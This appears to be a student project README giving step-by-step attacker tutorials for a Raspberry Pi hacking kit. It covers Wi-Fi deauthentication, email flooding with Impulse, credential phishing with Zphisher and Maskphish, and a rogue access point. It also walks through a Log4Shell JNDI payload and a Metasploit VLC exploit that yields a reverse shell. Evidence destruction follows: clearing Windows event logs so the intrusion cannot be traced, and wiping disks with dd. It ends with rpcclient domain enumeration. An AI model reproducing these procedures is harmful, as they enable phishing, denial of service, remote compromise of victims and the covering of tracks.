![image](https://user-images.githubusercontent.com/97077110/150097596-688dba82-8bf2-4a7c-83d3-74119e48e7de.png)




## Recon-ng gather information(can someone help me research more like wat other marketplace install)

Recon-ng is a full featured reconnaissance framework that aims to provide a powerful environment for doing open source web-based reconnaissance rapidly and thoroughly.  

Installation:  
```Sudo git clone https://github.com/lanmaster53/recon-ng.git```  
![image](https://user-images.githubusercontent.com/97077110/148882758-4d216ff2-e589-4dd4-879a-c3a4c7761515.png)  
## Using of Recon-ng  
Use commands  
```  
Cd recon-ng
./recon-ng
```  
![image](https://user-images.githubusercontent.com/97077110/148884598-fa333a26-36b7-4d87-9322-bd0b96f76d41.png)  
Create a template :workspaces create FYP  
![image](https://user-images.githubusercontent.com/97077110/148884707-97afda95-d464-49ee-b591-a595541d0b30.png)  

## Using of whois_procs:  
Use commands  
```  
marketplace install recon/domains-contact/whois_proc
Modules load recon/domains-contacts/whois_procs
Options set SOURCE facebook.com
run
```  
![image](https://user-images.githubusercontent.com/97077110/148884879-fc9c0a74-d646-42c8-b241-5179e75a98f9.png)  
Use  
```  
marketplace install discovery/info_discovery/info_disclosures/interesting_files   
Modules load discovery/info_disclosures/interesting_files.  
Options set SOURCE facebook.com  
```  
![image](https://user-images.githubusercontent.com/97077110/148885096-caaee32b-600d-48ac-828c-b1a99ebc63c1.png)  
![image](https://user-images.githubusercontent.com/97077110/148885136-d54b030d-119e-4bde-a550-d7b384bd3b70.png)  
![image](https://user-images.githubusercontent.com/97077110/148885166-f72a1697-3ef5-4691-bafe-1336dbcd0d88.png)  

# Red Python Wifi Ddos attack:  
## Installation of Red Python WIFI Dos:  
Use command ```git clone https://github.com /davidbombal/red-python-scripts.git```  
![image](https://user-images.githubusercontent.com/97077110/150920154-822e07b8-efa6-4124-a9e8-b08abc2af1fc.png)  
The tool will automatically search for any wireless access point around the area.  
![image](https://user-images.githubusercontent.com/97077110/150920199-987891b5-ee09-4de8-b12e-d780d5324c66.png)  
Choose the Wireless access point that you want to attack. Deauthentication frame will be sent to the target and the target’s connection with the Wi-Fi network will be terminated.  
This attack will also make the Wi-Fi slow and unstable. 
![image](https://user-images.githubusercontent.com/97077110/150920677-444f3d67-4a3e-44b5-96f2-52dd6552d9ad.png)











# Tshark  
## Installation of Tshark:  
use command ```sudo apt-get install tshark```  



Using of tshark:  
```
tshark [ -i <capture interface>|- ] [ -f <capture filter> ] [ -2 ] [ -r <infile> ] [ -w <outfile>|- ] [ options ] [ <filter> ]
```
![image](https://user-images.githubusercontent.com/97077110/148888944-45b496a7-c02b-416a-957e-83e83fecf20e.png  
# Macchanger  
## Installation of Macchanger
use command ```sudo apt-get install macchanger```   
![image](https://user-images.githubusercontent.com/97077110/148889187-28a50616-51dc-47ac-9a80-486338ac4705.png)  
Before Mac Changer:  
 ![image](https://user-images.githubusercontent.com/97077110/148903307-aa4bdb7c-672b-48d4-810e-7a8c35e9b22e.png)  
 After applying Mac Changer:  
 ![image](https://user-images.githubusercontent.com/97077110/148903399-e830a917-3623-458d-8ac2-6643c21b5e33.png)  
 Current New Mac changer:  
 ![image](https://user-images.githubusercontent.com/97077110/148903451-5c864143-0a30-4e2a-b36d-2014e30e4882.png)  
use command ```macchanger -l``` to list the mac address of the different vendor and devices  
![image](https://user-images.githubusercontent.com/97077110/148890376-a60085cd-2b02-4b61-b734-cfa68494e617.png)  
# Maskphish  
## Installation of Maskphish:  
### step 1:
use command ```sudo git clone https://github.com/jaykali/maskphish.git1```  
![image](https://user-images.githubusercontent.com/97077110/148890516-2c2cbece-2a13-4463-bfff-8825a5601e90.png)  
### step 2:  
use commands 
```  
cd maskphish
sudo chmod +x maskphish.sh
```  
![image](https://user-images.githubusercontent.com/97077110/148892291-2a92a737-db81-4587-9b64-c929018075b6.png)  
![image](https://user-images.githubusercontent.com/97077110/148892322-b4333806-78ee-4cbf-b424-73dc4527158f.png)  
![image](https://user-images.githubusercontent.com/97077110/148892352-2590fbc4-0280-4808-acd6-b5acaa6817fd.png)  

# Impulse tool:  
## Installation of Impulse:  
### Step 1:  
git clone https://github.com/LimerBoy/Impulse  
![image](https://user-images.githubusercontent.com/97077110/148892475-2cec9aa2-dce6-4dda-98cf-e09f634cc1a1.png)  
### Step 2:  
use commands 
```
cd impulse 
sudo pip3 install -r requirements.txt    
```  
![image](https://user-images.githubusercontent.com/97077110/148892577-d0ff727d-6bd7-4501-8d59-f764d1ed7142.png)  
## Using the impulse tool for email:  
### Step 1:  
use command ```python3 impulse.py --method email --threads 2 --target (target email)```  
![image](https://user-images.githubusercontent.com/97077110/148902041-a9e829e0-f119-4a1f-9250-6dfa1fac1e46.png)  
![image](https://user-images.githubusercontent.com/97077110/148902077-ee711ccf-93c4-415a-8b1e-2c6ffac6ed80.png)   
Target side:  
![image](https://user-images.githubusercontent.com/97077110/148902152-b2f30ca3-86d8-4c87-b7e5-43e9017d56ae.png)  

# Create_ap
## Installation of Create_ap  

To install create_ap, run the following commands.  
```
sudo apt-get install haveged hostapd git util-linux procps iproute2 iw dnsmasq iptables bettercap
git clone https://github.com/oblique/create_ap
cd create_ap
sudo make install
cd .. && rm -rf create_ap 
```  

Ensure that the pi has one interface receiving connection and one separate interface to host the rogue ap. Type ‘ip a’ to figure out which interface will be used to host the ap. It is commonly a WLAN interface.  
Next, type the command `sudo create_ap -m bridge eth0 wlan0 RogueAP`  

This tells create_ap to establish a bridged connection and take the internet connection from eth0 and host the ap using wlan0. The screenshot below shows what it is like to get it running successfully.


# Log4J :
## Installation of Log4J :  

```git clone https://github.com/kozmer/log4j-shell-poc```

![image](https://user-images.githubusercontent.com/97077110/149281113-f57e1edf-0845-4c47-bc0c-47334f8f8724.png)  

```pip install -r requirements.txt```  
![image](https://user-images.githubusercontent.com/97077110/149281805-f11e9f26-2640-43c3-a7f5-f8d70d9b5059.png)
 
Log4J require a JDK file that can be downloaded from:  
```https://www.oracle.com/java/technologies/downloads/```  

Move the file from downloads to the log4j-shell-proc directory:  
```sudo mv jdk-8u202-linux-1586.tar.gz /home/kali/log4j-shell-proc```  
![image](https://user-images.githubusercontent.com/97077110/149284324-3a4a9672-a21b-4899-8b13-19dfb3ac0fa9.png)  

Extract the file the log4j-shell-poc:  
```sudo tar -xf jdk-8u202-linux-i586.tar.gz```  
![image](https://user-images.githubusercontent.com/97077110/149284550-bf5bb89b-6124-4cee-aa7a-a842fdc4300a.png)  

Start the http server at log4j-shell-poc:  
sudo python3 -m http.server 8081
![image](https://user-images.githubusercontent.com/97077110/149284764-586bb774-c883-4f86-a126-b8e75c85e94c.png)  

Start a netcat listener   
```nc-lvnp 1389```

![image](https://user-images.githubusercontent.com/97077110/149284876-5492d201-f847-4850-92fe-6b3c8c38f927.png)


Start Log4j-shell-poc :  
Run command python3 poc.py --userip (Host ip)
![image](https://user-images.githubusercontent.com/97077110/149285077-e1b43750-6052-4286-b81c-2ac0918444b7.png)    

A payload is generated : ${jndi:ldap://l72.16.36.11:1389/a}


Target side :  
We can insert the code to the search filter of GHIDRA

![image](https://user-images.githubusercontent.com/97077110/149285158-a6eb9225-2690-4714-bb2e-34bcc638b16d.png)



Attacker side:  
A connection is established  
![image](https://user-images.githubusercontent.com/97077110/149285441-7809f5e5-494b-4c9f-9330-fff55d4fcc2d.png)  

![image](https://user-images.githubusercontent.com/97077110/149285349-4009e9d8-ee61-481f-8d21-8432d024a195.png)


## VLC msfconsole:  

Run ```msfconsole ```

![image](https://user-images.githubusercontent.com/97077110/149287085-10a21ee8-5bab-447d-b227-a07a44bbca97.png)  

```use exploit/windows/fileformat/vlc_mkv```
![image](https://user-images.githubusercontent.com/97077110/149287224-085778c8-2411-4d4d-a450-18368db7cfac.png)

```set LHOST (host ip)```
![image](https://user-images.githubusercontent.com/97077110/149287351-099f5084-6874-44f9-93bf-8eb7cdf15200.png)

```exploit```  
![image](https://user-images.githubusercontent.com/97077110/149287459-ad5c6c9b-f783-4ed2-a947-bba6fafbf477.png)  


Copy the payload file into the web directory  
```sudo cp /home/kali/.msf4/local/elf-part1.mkv /var/www/html/FYP1```
![image](https://user-images.githubusercontent.com/97077110/149290400-14f63585-b9a8-45cd-8483-c06545c29a9a.png)

On msfconsole ,create a reverse shell to connect back to the target :  
```use multi/handler```  
```set LHOST 192.168.86.129```  
```set payload windows/x64/shell/reverse_tcp```  

![image](https://user-images.githubusercontent.com/97077110/149290641-f380a358-ada2-48f9-bb63-e7521afb199f.png)  

Target side:
Ensure that the VLC verison is 2.2.8 or older  
![image](https://user-images.githubusercontent.com/97077110/149291096-650ba2c9-c57f-44c7-b887-77591fca83b0.png)

Download the two video file
![image](https://user-images.githubusercontent.com/97077110/149291131-ba13847e-337e-49ea-bf7f-5a62d788a0d0.png)

![image](https://user-images.githubusercontent.com/97077110/149291179-d5197dff-9b0d-4d6f-bee8-ebbcc47a9be9.png)

Run the file using VLC :
![image](https://user-images.githubusercontent.com/97077110/149291235-1884a30b-c8de-4a2c-a57a-b73c2a00331d.png)  

Attacker side:
A reverse shell is created.
![image](https://user-images.githubusercontent.com/97077110/149291285-4d924a83-94fd-4a0d-85bd-a107ea62867a.png)

## Zphiser:
A phising tool that consists of websites template that we can use to phish crendential from target.   
## Installation of Zphisher:  
use command ```git clone https://github.com/hr-tech/zphiser```  
![image](https://user-images.githubusercontent.com/97077110/149759958-e2110b7c-6646-47ba-ad62-681a9786d4c0.png)   
To give permission to the file for it to be a executable use command ```chmod +x zphiser.sh```  
```bash zphiser.sh```  
![image](https://user-images.githubusercontent.com/97077110/149761036-c9d862fc-5472-41c9-b300-e3ccaed819bc.png)  
This is the menu for Zphisher. 
![image](https://user-images.githubusercontent.com/97077110/149761086-b728070c-c39b-4052-915c-26e3e17dfef5.png)  

Select Cloudflared option  
![image](https://user-images.githubusercontent.com/97077110/149761568-45bdc0bd-f568-4401-b488-425209246866.png)  

Send the link to target:  
ziphisher can be ued together with maskphish to make the link less suspicious to the target.
![image](https://user-images.githubusercontent.com/97077110/149761699-92aebd29-96ce-421a-ba20-d413425474fe.png)
On the Target side:  
![image](https://user-images.githubusercontent.com/97077110/150919838-3e49f6ff-e43c-45d1-b4bd-922aba1f1765.png)




## Wiping the logs  
Firstly, the very initial step in ensuring that all logs would be cleared , would be by clearing the event logs from the system that you invaded. Fortunately for Windows systems , Kali Linux has a tool in Metasploit named “clearev”. Clearev helps to clear windows event logs automatically without the attacker manually doing it. As it would be very obvious if the event logs show zero logs , they could not be traced back to you as the logs containing intruded details and information are erased.  
 
To perform Clearev, users would just need to head into Meterpreter. Once the user is inside the Meterpreter , just need to run it as no initial configuration or setup is required.   

As shown in the image attached below, it shows that there are 15,403 events that are being recorded by the Windows Logs in Event Viewer.  

With the help of Meterpreter , we use the command “clearev” to remove logs that are in the applications.  

![image](https://user-images.githubusercontent.com/97077110/150921380-1c51854d-9558-4471-9d34-7409e6ccd819.png)  
![image](https://user-images.githubusercontent.com/97077110/150921424-ba15aabd-4adc-44d9-ac15-5b2d75898231.png)  


## Resetting the Raspberry Pi to factory settings    
 
First method , Software Reset.  

Firstly, ensure that parted is installed on your device. To confirm if its installed on your device, type “parted --version”.  

If it is not installed , you can install it with the following commands.  
```sudo apt update```   
```sudo apt install parted```  

Next, identify the SD card name with this command.
```Lsblk```  

Afterwards , the command will then list down a list of all available block devices.
After identifying your device's name , key in the following commands.  

This command is to create a partition table , and my device name is /dev/sdb , change accordingly to your device name. 

```sudo parted /dev/sdb --script -- mklabel msdos```   

Next , create a FAT32 partition that takes up the whole drive.  

```sudo parted /dev/sdb --script -- mkpart primary fat32 1MiB 100%```  

Afterwards, format the boot partition to FAT32.  

```sudo mkfs.vfat -F32 /dev/sdb1```  

That's it! All is done for software reformatting of SD card.   

Next , it would be physically destroying the SD card. In this instance , remove the SD card from the Raspberry PI and cut it into many pieces would ensure that all data in the SD card is gone.     
![image](https://user-images.githubusercontent.com/97077110/150921806-f49647e1-32e4-4fc2-8a50-531db425bda9.png)  

## Remotely Corrupting Kali Linux  


First locate the disk that you are going to corrupt with the command below. It is important to ensure the disk that you are removing is correct as deleting the wrong disk could also mean that your digital footprints are still alive in the Pi.  

```sudo fdisk -l```  
![image](https://user-images.githubusercontent.com/97077110/150922054-4bc1673c-20b1-4252-bc91-f08ba25f747b.png)   




After locating the disk that you are gonna erase , key in “ sudo dd if=/dev/zero of=/dev/sda1 “.
Reason why the end was /dev/sda1 was because I intended to erase that targeted disk , hence I key in /dev/sda1 at the end. Furthermore , this command was used because I am overwriting the bytes, making the data harder to recover.  

![image](https://user-images.githubusercontent.com/97077110/150922147-5b51768a-b85c-41d5-acf0-26f4a97f8f08.png)  

  
Kali Linux will hang and then a black screen will appear , showing that the disk has already been corrupted.  



## Rpcclient  
Rpcclient is a tool to perform tests on MS-RPC functionality in Samba, but for this instance, we will use it to gather information about domain controllers.  

But to ensure that Rpcclient will work well, make sure your kali linux is able to ping the domain controller , and the domain controller is able to ping your kali linux.  

Firstly, go to the terminal in Kali Linux. Type “Rpcclient -U (domain username) % ( password of domain account) followed by IP address of domain controller. This process is to login to the domain controller with a current user that is residing in the domain controller. Thus, this instance would be using Rpcclient to login to the domain with the account name joelsim , along with his password Smile@123  

![image](https://user-images.githubusercontent.com/97077110/150925566-77ee531d-a5a5-4ee2-a6c7-8797357d890c.png)  

Figure 0.

Next, once you are in the Rpcclient , you are able to gather the DC info. For example , “srvinfo” gives you information about that DC. Hence , the image below will show you an example of various types of details we can get with “ srvinfo “.  
![image](https://user-images.githubusercontent.com/97077110/150925643-70ae4bb2-bdd3-4037-99cc-e432cc1b644f.png)




To find out all users in that DC , key in “ enumdomusers “ , and it will list down all users in that DC.  
![image](https://user-images.githubusercontent.com/97077110/150925685-98b03702-4b05-4961-9063-67903413fcbc.png)



To find a particular user’s detail in that DC , “ queryuser followed by (name of that user) “.  

![image](https://user-images.githubusercontent.com/97077110/150925734-178b938e-5327-41d3-bf73-c694a447de67.png)
















































	
	




























  










































































































  
